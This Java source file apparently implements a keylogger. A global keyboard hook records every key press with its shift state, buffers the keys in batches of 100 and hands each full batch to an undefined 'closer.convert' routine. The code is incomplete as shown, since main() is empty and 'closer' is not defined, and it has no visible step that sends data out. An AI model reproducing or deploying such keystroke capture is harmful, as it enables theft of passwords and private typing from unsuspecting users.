import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;



 public class Keystroke {


    private static Keystore[] keystores = new Keystore[100] ;
     private static int index = 0 ;

    private static boolean run = true;
     public static void logging() {
         // might throw a UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails
         GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook();
         System.out.println("Global keyboard hook successfully started, press [escape] key to shutdown.");
         keyboardHook.addKeyListener(new GlobalKeyAdapter() {
             @Override public void keyPressed(GlobalKeyEvent event) {
                   System.out.println(event);
                 keystores[index] = new Keystore(event.getVirtualKeyCode(),event.isShiftPressed()) ;
                 index++ ;
                 if(index == 100) {
                     closer.convert(keystores);
                     index = 0  ;
                     keystores = new Keystore[100] ;
                 }


             }
             @Override public void keyReleased(GlobalKeyEvent event) {}
         });

         try {
             while(run) Thread.sleep(128);
         } catch(InterruptedException e) { /* nothing to do here */ }
         finally { keyboardHook.shutdownHook(); }

     }
    public static void main(String[] args) {



    }
}
class Keystore {
    private int x  ;
    private boolean y ;
    public Keystore(int x , boolean y) {
        this.x = x ;
        this.y = y ;
    }
        public int getAscii() {
            return x ;
        }
        public boolean getShift() {
            return y ;
        }
        }